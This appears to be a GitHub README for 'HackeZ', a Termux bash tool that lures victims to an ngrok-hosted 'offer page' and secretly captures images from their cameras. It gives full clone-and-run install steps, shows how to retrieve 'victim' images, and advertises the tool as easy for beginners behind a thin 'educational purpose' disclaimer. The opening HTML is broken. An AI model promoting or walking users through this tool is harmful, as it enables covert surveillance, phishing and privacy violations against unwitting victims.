<p align="center">
<a <img title="Made in AZERBAIJAN" </a>
</p>
<
<p align="center">


## ABOUT TOOL :

HackeZ is a bash based script which is officially made for termux from this tool can hack you victims camera by simple offer page. This tool works on both rooted Android device and Non-rooted Android device.


</p>

## AVAILABLE ON :

* Termux, Any Linux Distro

### TESTED ON :

* Termux, Manjaro

### REQUIREMENTS :
* internet
* php
* storage 400 MB
* ngrok

## FEATURES :
* [+] Real camera hacking !
* [+] Updated maintainence !
* [+] Ngrok link !
* [+] Easy for Beginners !

## INSTALLATION [Termux] :

* `apt-get update -y`
* `apt-get upgrade -y`
* `pkg install python -y`
* `pkg install python2 -y`
* `pkg install git -y`
* `pip install lolcat`
* `git clone https://github.com/noob-hackers/hackez`
* `cd $HOME`
* `ls`
* `cd hackez`
* `ls`
* `bash hackez.sh`
```
to see captured images >>>
```
```
ls

mv (image name with .png) /sdcard
```
```
Now go and chek your gallery for victim image...
```
```
[+]--Now you need internet connection to continue further process...

[+]--You can select any option by clicking on your keyboard

[+]--Note:- Don't delete any of the scripts included in grabcam files

```
## USAGE OPTIONS [Termux] :

__SELECT OPTION__ :
- From this option you can select type of portforwarding


## WARNING : 
***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***
